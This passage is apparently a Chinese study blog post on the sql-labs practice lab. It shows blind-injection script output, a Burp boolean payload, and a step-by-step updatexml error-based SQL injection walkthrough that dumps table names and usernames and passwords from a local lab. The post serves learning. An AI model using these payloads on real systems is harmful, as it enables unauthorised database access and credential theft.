admin1<br>[+] 数据[<span class="hljs-number">9</span>]: admin1<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin2<br>[+] 数据[<span class="hljs-number">10</span>]: admin2<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin3<br>[+] 数据[<span class="hljs-number">11</span>]: admin3<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dumbo<br>[+] 数据[<span class="hljs-number">12</span>]: dumbo<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin4<br>[+] 数据[<span class="hljs-number">13</span>]: admin4<br><br></code></pre></td></tr></table></figure>
+<h3 id="bp盲注爆破"><a href="#bp盲注爆破" class="headerlink" title="bp盲注爆破"></a>bp盲注爆破</h3><p>csdn上看到可以直接不用写脚本直接用bp看返回长度来爆破的<br>看来也可以不用if函数来构造payload</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;and</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) =<span class="hljs-string">&#x27;s&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>能达到同样效果</p>
+<p>bp爆破的话payload设置的前后和循序有点难搞，但是原理知道了可以一次一次慢慢试；</p>
+<h2 id="xml报错注入"><a href="#xml报错注入" class="headerlink" title="xml报错注入"></a>xml报错注入</h2><p>前提是在有sql报错信息输出的前提下（存在print_r(mysql_error())函数）</p>
+<p>在高版本MySQL（5.1）中添加了对xml文档进行查询和修改的函数</p>
+<p>update函数：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">UPDATEXML</span><span class="hljs-params">(xml_target, xpath_expr, new_xml)</span></span><br><br>xml_target：要更新的XML文档。<br>xpath_expr：XPath表达式，用于定位需要更新的节点。<br>new_xml：新的XML片段或值，用于替换目标节点的值。<br></code></pre></td></tr></table></figure>
+<p>extractvalue函数：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">EXTRACTVALUE</span><span class="hljs-params">(xml_target, xpath_expr)</span></span><br></code></pre></td></tr></table></figure>
+<p>原理是用xpath的非法字符报错<br>KIMI：</p>
+<blockquote>
+<p>updatexml()和extractvalue()函数在处理XML数据时，会使用XPath表达式来定位或提取节点。如果XPath表达式不符合语法规范，MySQL会返回错误信息。攻击者可以利用这一特性，通过拼接恶意的XPath表达式，使数据库报错，并在错误信息中泄露敏感数据。  </p>
+</blockquote>
+<p>流程：  </p>
+<p>1.判断闭合点<br>2.判断是否存在xml报错注入：<br>使用<strong>updatexml</strong></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-number">0x7e</span> 是 ~ 的<span class="hljs-number">16</span>进制表示，用来进行绕过，字符串替换成十六进制数有一定的绕过作用<br></code></pre></td></tr></table></figure>
+<p>成功回显</p>
+<blockquote>
+<p>XPATH syntax error: ‘~’  </p>
+</blockquote>
+<p>说明存在报错注入</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x7e, (<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">0</span>x7e), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>爆库名</p>
+</blockquote>
+<p><em><strong>note</strong></em> </p>
+<p>concat和group_concat有什么区别,问了kimi，<br><em><strong>我总结就是concat用来拼接字符串，group_concat用来拼接表中的内容</strong></em></p>
+<p>然后就是走注入流程  </p>
+<p>爆表名</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘  </p>
+</blockquote>
+<p>爆字段</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name)<span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1)--+<br><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>id,username,password</del>‘</p>
+</blockquote>
+<p>爆表</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">32768</span>/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>group_concat(id,username,password)from%<span class="hljs-number">20</span>users),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘~1DumbDumb,2AngelinaI-kill-you,3’  </p>
+</blockquote>
+<p>发现回显不完全，听说xpath报错有长度限制，改为：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>发现limit的值改变了依然没结果，看了眼csdn，发现group_concat要改为concat，<br>问了kimi，limit是限制输出的行在哪，如(0,1)就会限制为从第一行开始提取一列，但是用group_concat，会将一整个表整合为一行，限制就没用了。</p>
+<p>最后payload改为</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>成功，只要一条条爆出users表中内容就行了。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># sql-labs less6</span><br><br>和less5原理一样<br></code></pre></td></tr></table></figure>
+<p>select * from users where id&#x3D;”$get_id”</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">闭合payload改为<br></code></pre></td></tr></table></figure>
+<p>?id&#x3D;1”</p>
+<pre><code class="hljs">即可
+</code></pre>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql-labs/" class="print-no-link">#sql-labs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>note-03</div>
+      <div>https://aidemofashi.github.io/2025/02/28/note-03/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/02/note-04/" title="note-04">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">note-04</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/27/blog%E5%A4%87%E6%B3%A8/" title="blog备注">
+                        <span class="hidden-mobile">blog备注</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
